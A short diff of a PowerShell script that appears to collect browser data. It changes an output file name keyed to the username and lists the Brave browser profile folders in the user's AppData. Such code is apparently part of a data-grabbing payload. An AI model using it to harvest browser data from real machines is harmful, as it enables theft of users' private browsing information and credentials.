@@ -38,7 +38,7 @@ function Get-BrowserData {
     } 
 }
 
-$FileName = "$env:USERNAME-BrowserData-$(get-date -f yyyy-MM-dd_hh-mm).txt"
+$FileName = "$env:USERNAME-BrowserData-$(get-date -f yyyy-MM-dd_hh-mm-ss).txt"
 
 $Brave_Profiles = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\" -Directory | Where-Object { $_.Name -like "Profile*" } | Select-Object -ExpandProperty Name
 
